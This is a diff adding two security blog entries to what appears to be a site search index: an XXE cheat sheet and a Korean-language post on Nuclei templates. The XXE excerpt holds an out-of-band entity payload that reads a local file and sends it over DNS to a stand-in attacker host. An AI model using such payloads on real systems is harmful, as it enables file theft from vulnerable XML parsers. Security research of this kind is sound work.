@@ -1,6 +1,30 @@
 [
   
     {
+      "title"    : "XXE_Cheat_sheet",
+      "title-lower"    : "xxe_cheat_sheet",
+      "sub-titile" : "",
+      "sub-titile-lower" : "",
+      "categories" : "Security",
+      "tags"     : "bugbountytip",
+      "url"      : "/security/2020/08/13/XXE_Cheat_Sheet.html",
+      "date"     : "2020-08-13 04:00:00 +0900",
+      "content"     : "XXE-OOB-Over-DNS&amp;lt;!ENTITY % data SYSTEM &quot;file:///tmp/foo&quot;&amp;gt;&amp;lt;!ENTITY % url &quot;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &#39;http://%data;.my.evil.server&#39;&amp;g..."
+    } ,
+  
+    {
+      "title"    : "Let&#39;s make Nuclei Template",
+      "title-lower"    : "let&#39;s make nuclei template",
+      "sub-titile" : "",
+      "sub-titile-lower" : "",
+      "categories" : "Security",
+      "tags"     : "tool, bugbounty",
+      "url"      : "/security/2020/08/13/about_nuclei_tamplate.html",
+      "date"     : "2020-08-13 03:00:00 +0900",
+      "content"     : "https://github.com/projectdiscovery/nucleiAbout NucleiNuclei는 projectdiscovery의 브랜치로 대규모 확장성과 사용 편의성을 제공하는 템플릿을 기반으로 구성 가능한 대상 스캔을 위한 빠른 도구로 GO로 작성되어 있다.사실 단순 http-go만으로 작성된 request 툴이라면, 그리 매력적인 도..."
+    } ,
+  
+    {
       "title"    : "terminal output pipe command cheatsheet.",
       "title-lower"    : "terminal output pipe command cheatsheet.",
       "sub-titile" : "",
